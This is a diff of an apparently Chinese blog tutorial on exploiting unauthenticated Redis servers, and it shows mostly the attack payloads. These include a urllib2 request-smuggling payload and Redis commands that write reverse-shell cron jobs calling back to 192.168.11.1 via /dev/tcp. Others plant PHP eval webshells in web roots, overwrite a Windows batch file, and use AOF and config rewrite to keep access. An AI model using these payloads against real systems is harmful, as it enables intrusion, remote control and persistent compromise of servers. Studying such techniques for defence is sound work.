@@ -442,7 +442,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    4.9k
+                    4.8k
                 </div>
                 
 
@@ -468,7 +468,7 @@
 <p>5.其他方式<br>其他还可以用NC工具来连接使用。甚至在未授权的情况下还可以用python的urllib2模块的http请求走私特性利用：</p>
 <pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding:utf-8 -*-</span>
 <span class="token keyword">import</span> urllib2
-url <span class="token operator">=</span> <span class="token string">"http://127.0.0.1:6379?info HTTP/1.1\r\nflushall\r\nconfig set dir C:/\r\nconfig set dbfilename shell.php\r\nset 'webshell' '&lt;?php phpinfo();exit(666);?&gt;'\r\nsave\r\nQUIT\r\na:a\r\n\r\n"</span>
+url <span class="token operator">=</span> <span class="token string">"http://127.0.0.1:6379?info HTTP/1.1\r\nflushall\r\nconfig set dir C:/\r\nconfig set dbfilename shell.php\r\nset 'webshell' '&lt;?php phpinfo();exit(666);?>'\r\nsave\r\nQUIT\r\na:a\r\n\r\n"</span>
 htmlpage <span class="token operator">=</span> urllib2<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
 <span class="token keyword">print</span><span class="token punctuation">(</span>htmlpage<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <h3 id="Redis-Install-For-Linux"><a href="#Redis-Install-For-Linux" class="headerlink" title="Redis Install For Linux"></a>Redis Install For Linux</h3><p>在Linux上安装Redis，一般以源码编译方式安装，源码详见：<a target="_blank" rel="noopener" href="https://github.com/redis/redis">Redis仓库</a>     <a target="_blank" rel="noopener" href="https://redis.io/download">官网下载地址</a> 。<br>环境搭建首先以源码编译安装的方式在Linux下搭建3.2.0来验证默认配置下的保护模式，然后安装3.0.7版本在默认配置下进行利用，最后安装4.x/5.x/6.x配置未授权进行利用。</p>
@@ -477,21 +477,21 @@ htmlpage <span class="token operator">=</span> urllib2<span class="token punctua
 $ tar xzf redis-3.2.0.tar.gz
 $ cd redis-3.2.0
 $ make
-$ cd src &amp;&amp; ./redis-server<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+$ cd src && ./redis-server<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/ed7c038d7978ce468ce1d0ef7baea7cc.png"><br>这时候使用外部IP连接时果然会提示，所以在Linux版本&gt;=3.2.0以上没有手动配置绑定在外部IP上的话是不能远程利用的(所以后面的需要在配置文件redis.conf中手动配置<code>protected-mode no</code>和<code>bind 0.0.0.0</code>)：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/f0d65cdb6884b0218f0c93ec285a0b18.png"></p>
 <p>2.安装3.0.7(&lt;3.2.0最近的就是这个了)：</p>
 <pre class="line-numbers language-shell"><code class="language-shell">$ wget https://download.redis.io/releases/redis-3.0.7.tar.gz
 $ tar xzf redis-3.0.7.tar.gz
 $ cd redis-3.0.7
 $ make
-$ cd src &amp;&amp; ./redis-server<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+$ cd src && ./redis-server<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/c897142bf1526e1e2e2b349066881acb.png"></p>
 <p>3.Redis6.2.6安装</p>
 <pre class="line-numbers language-shell"><code class="language-shell">$ wget https://download.redis.io/releases/redis-6.2.6.tar.gz
 $ tar xzf redis-6.2.6.tar.gz
 $ cd redis-6.2.6
 $ make
-$ cd src &amp;&amp; ./redis-server<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+$ cd src && ./redis-server<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>修改默认配置文件关闭保护模式并绑定IP（<code>bind 0.0.0.0 ，protected-mode no</code>）:<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/1b3d18fc3a70f386bc757c326cc141d7.png"><br>加载配置文件启动<code>./redis-server ../redis.conf</code>：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/f226ac8aaadcc072a6caf5ac22e8e01e.png"></p>
 <p>4.Docker 环境<br><a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/tree/master/redis/4-unacc">vulhub</a><br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/ed8fb9d44d975a36d16033f3a26f3ab3.png"></p>
 <p><a target="_blank" rel="noopener" href="https://hub.docker.com/_/redis">dockerhub-redis</a><br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/792704d7190b0d603cb165a695c2f52d.png"></p>
@@ -591,7 +591,7 @@ CONFIG GET DIR              <span class="token comment" spellcheck="true"># 查�
 CONFIG SET dir <span class="token operator">/</span>path<span class="token operator">/</span>www<span class="token operator">/</span>html    <span class="token comment" spellcheck="true"># 修改备份目录  </span>
 CONFIG GET dbfilename         <span class="token comment" spellcheck="true"># 查询备份文件名，方便恢复</span>
 CONFIG SET dbfilename trojan<span class="token punctuation">.</span>php  <span class="token comment" spellcheck="true"># 修改备份文件名为我们的shell名</span>
-SET trojan <span class="token string">"&lt;?php phpinfo(); ?&gt;"</span>  <span class="token comment" spellcheck="true"># 设置KEY和值</span>
+SET trojan <span class="token string">"&lt;?php phpinfo(); ?>"</span>  <span class="token comment" spellcheck="true"># 设置KEY和值</span>
 BGSAVE  <span class="token operator">/</span> SAVE              <span class="token comment" spellcheck="true"># 异步/阻塞 保存当前数据库的数据到磁盘</span>
 DEL trojan                 <span class="token comment" spellcheck="true">#删除恶意键          </span>
 恢复：
@@ -660,15 +660,15 @@ bgsave<span aria-hidden="true" class="line-numbers-rows"><span></span><span></sp
 <p>由于Ubuntu的计划任务不能容错，语法会进行严格检查:<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/2c504bdb7af9d8e9b5c186a817c25768.png"><br>所以写计划任务用到了Docker搭建CentOS环境来测试，Redis命令写入计划任务文件夹<code>/etc/cron.d</code>：</p>
 <pre class="line-numbers language-bash"><code class="language-bash">config <span class="token keyword">set</span> <span class="token function">dir</span> /etc/cron.d
 config <span class="token keyword">set</span> dbfilename x
-<span class="token keyword">set</span> x <span class="token string">"\n\nSHELL=/bin/bash\n\n* * * * * root bash -i &gt;&amp; /dev/tcp/192.168.11.1/6666 0&gt;&amp;1\n\n"</span>
-<span class="token comment" spellcheck="true">#set x "\n\n* * * * * ftp bash -i &gt;&amp; /dev/tcp/192.168.11.1/6666 0&gt;&amp;1\n\n"</span>
+<span class="token keyword">set</span> x <span class="token string">"\n\nSHELL=/bin/bash\n\n* * * * * root bash -i >&amp; /dev/tcp/192.168.11.1/6666 0>&amp;1\n\n"</span>
+<span class="token comment" spellcheck="true">#set x "\n\n* * * * * ftp bash -i >&amp; /dev/tcp/192.168.11.1/6666 0>&amp;1\n\n"</span>
 save<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/a01700f56255272f2e5657941c08f9f3.png"></p>
 <p>写入 <code>/var/spool/cron/</code>：</p>
 <pre class="line-numbers language-bash"><code class="language-bash">FLUSHALL
 config <span class="token keyword">set</span> <span class="token function">dir</span> /var/spool/cron
 config <span class="token keyword">set</span> dbfilename bin  <span class="token comment" spellcheck="true"># 以用户名命名文件</span>
-<span class="token keyword">set</span> x <span class="token string">"\n\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.11.1/6666 0&gt;&amp;1\n\n"</span>
+<span class="token keyword">set</span> x <span class="token string">"\n\n* * * * * bash -i >&amp; /dev/tcp/192.168.11.1/6666 0>&amp;1\n\n"</span>
 save<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>反弹回bin用户的shell:<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/c5f026052faf1c2c331f8c88d055d30a.png"></p>
 <p><strong>Windows写启动项</strong><br>通过文件写入启动项后，在系统重启后执行脚本，主要是写.bat .cmd等支持容错的文件执行其他命令(powershell、mshta、regsvr32等等)来利用(windows下换行<code>\r\n</code>)：</p>
@@ -681,26 +681,26 @@ save<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span
 <p><strong>Windows文件覆盖</strong><br>有时候目标服务器一直不会重启，那么可以考虑覆盖一些其他的bat文件等来增加触发几率，可以利用<code>EVAL "return dofile('xxx') 0</code>探测文件是否真的存在。PHPStudy环境中的bat文件：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/9e48cf26937d98b3a102eb6b412dd96b.png"><br>通过Redis默认的dir参数可以知道绝对路径：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/0b77db0e5556150ce63a48b52033dc8a.png"><br>比如覆盖Apache下的check.bat脚本(如果触发后就会执行命令):</p>
 <pre class="line-numbers language-python"><code class="language-python">config set dir <span class="token string">"D:/phpstudy_pro/Extensions/Apache2.4.39/bin"</span>
 config set dbfilename check<span class="token punctuation">.</span>bat
-set x <span class="token string">"\r\n\r\nhttpd.exe\r\ncmd /c calc\r\npause &gt; nul\r\n"</span>
+set x <span class="token string">"\r\n\r\nhttpd.exe\r\ncmd /c calc\r\npause > nul\r\n"</span>
 save<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 <p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/fc91a408ddc88709de58aba050248a44.png"></p>
 <p><strong>WEB绝对路径写Wbeshell</strong><br>如果Redis环境中同时存在WEB环境，在Redis权限比较高的情况下，可以尝试获取到绝对路径后写入Webshell，一般以二进制文件启动的程序是启动用户的权限，比较适合利用，以安装服务(yum install redis)等启动的权限会比较有限。</p>
 <p>Windows+PHPStudy:</p>
 <pre class="line-numbers language-python"><code class="language-python">config set dir <span class="token string">"D:/phpstudy_pro/WWW"</span> 
 config set dbfilename redisshell<span class="token punctuation">.</span>php
-set x <span class="token string">"\r\n\r\n&lt;?php eval($_GET[1]);?&gt;\r\n\r\n"</span>
+set x <span class="token string">"\r\n\r\n&lt;?php eval($_GET[1]);?>\r\n\r\n"</span>
 save<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 <p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/f9bae99834a2ca2f2665c1b9b660413d.png"></p>
 <p>在CentOS+PHPStudy下：</p>
 <pre class="line-numbers language-python"><code class="language-python">config set dir <span class="token string">"/var/www/html"</span> 
 config set dbfilename redisshell<span class="token punctuation">.</span>php
-set x <span class="token string">"\n\n&lt;?php eval($_GET[1]);?&gt;\n\n"</span>
+set x <span class="token string">"\n\n&lt;?php eval($_GET[1]);?>\n\n"</span>
 save<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 <p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/2ef26d7345cd7a1e6e20a88abe52e49e.png"></p>
 <p>Centos + Apache下:</p>
 <pre class="line-numbers language-python"><code class="language-python">config set dir <span class="token string">"/var/www/html"</span> 
 config set dbfilename redisshell<span class="token punctuation">.</span>php
-set x <span class="token string">"\n\n&lt;?php eval($_GET[1]);?&gt;\n\n"</span>
+set x <span class="token string">"\n\n&lt;?php eval($_GET[1]);?>\n\n"</span>
 save<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 <p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/f8df2ca875ec434336e7d9fd60513394.png"><br>如果权限不足，无法写入：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/2e23b73f321efe0a5d5a5fbba526a674.png"></p>
 <h4 id="AOF-配置重写持久化"><a href="#AOF-配置重写持久化" class="headerlink" title="AOF+配置重写持久化"></a>AOF+配置重写持久化</h4><p>由于不能设置appendfilename参数，不能AOF写任意后缀文件。但是可以通过该方式进行权限维持，在配置文件开启AOF后，Redis在重启后会执行其中的命令以恢复数据，结合配置文件重写达到redis在重启后写入webshell的效果(save之类的命令不会被aof记录)，执行命令：</p>
@@ -713,7 +713,7 @@ config set dir <span class="token string">"D:/phpstudy_pro/WWW/Redis"</span>
 <span class="token comment" spellcheck="true">#设置RDB文件名</span>
 config set dbfilename redisshell<span class="token punctuation">.</span>php  
 <span class="token comment" spellcheck="true">#设置一个key</span>
-set x <span class="token string">"\r\n\r\n&lt;?php eval($_GET[1]);?&gt;\r\n\r\n"</span>   
+set x <span class="token string">"\r\n\r\n&lt;?php eval($_GET[1]);?>\r\n\r\n"</span>   
 <span class="token comment" spellcheck="true">#设置aof增长重写幅度，1kb涨到1.5kb就重写</span>
 config set auto<span class="token operator">-</span>aof<span class="token operator">-</span>rewrite<span class="token operator">-</span>percentage <span class="token number">50</span>
 <span class="token comment" spellcheck="true">#设置AOF文件最小重写的大小（字节）。第一次达到1mb就重写</span>
@@ -734,7 +734,7 @@ CONFIG REWRITE                       <span aria-hidden="true" class="line-number
 <p><strong>Linux写计划任务</strong><br>Windows下编写计划任务文件注意<code>\r\n</code>换行要变成<code>\n\n</code>,Ubuntu计划任务文件尾行需要换行：</p>
 <pre class="line-numbers language-python"><code class="language-python">SHELL<span class="token operator">=</span><span class="token operator">/</span>bin<span class="token operator">/</span>bash
 PATH<span class="token operator">=</span><span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span>sbin<span class="token punctuation">:</span><span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span>bin<span class="token punctuation">:</span><span class="token operator">/</span>sbin<span class="token punctuation">:</span><span class="token operator">/</span>bin<span class="token punctuation">:</span><span class="token operator">/</span>usr<span class="token operator">/</span>sbin<span class="token punctuation">:</span><span class="token operator">/</span>usr<span class="token operator">/</span>bin
-<span class="token operator">*</span> <span class="token operator">*</span> <span class="token operator">*</span> <span class="token operator">*</span> <span class="token operator">*</span> root bash <span class="token operator">-</span>i <span class="token operator">&gt;</span><span class="token operator">&amp;</span> <span class="token operator">/</span>dev<span class="token operator">/</span>tcp<span class="token operator">/</span><span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">11.1</span><span class="token operator">/</span><span class="token number">6667</span> <span class="token number">0</span><span class="token operator">&gt;</span><span class="token operator">&amp;</span><span class="token number">1</span>
+<span class="token operator">*</span> <span class="token operator">*</span> <span class="token operator">*</span> <span class="token operator">*</span> <span class="token operator">*</span> root bash <span class="token operator">-</span>i <span class="token operator">></span><span class="token operator">&amp;</span> <span class="token operator">/</span>dev<span class="token operator">/</span>tcp<span class="token operator">/</span><span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">11.1</span><span class="token operator">/</span><span class="token number">6667</span> <span class="token number">0</span><span class="token operator">></span><span class="token operator">&amp;</span><span class="token number">1</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p>脚本执行命令：</p>
 <pre class="line-numbers language-python"><code class="language-python">python3 RedisWriteFile<span class="token punctuation">.</span>py <span class="token operator">-</span><span class="token operator">-</span>rhost <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">11.133</span> <span class="token operator">-</span><span class="token operator">-</span>rport <span class="token number">6379</span> <span class="token operator">-</span><span class="token operator">-</span>lhost <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">11.1</span> <span class="token operator">-</span><span class="token operator">-</span>lport <span class="token number">16379</span> <span class="token operator">-</span><span class="token operator">-</span>rpath <span class="token string">"/etc/cron.d"</span> <span class="token operator">-</span><span class="token operator">-</span>rfile shell <span class="token operator">-</span><span class="token operator">-</span>lfile <span class="token punctuation">.</span><span class="token operator">/</span>cron<span class="token operator">/</span>cron<span class="token punctuation">.</span>d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
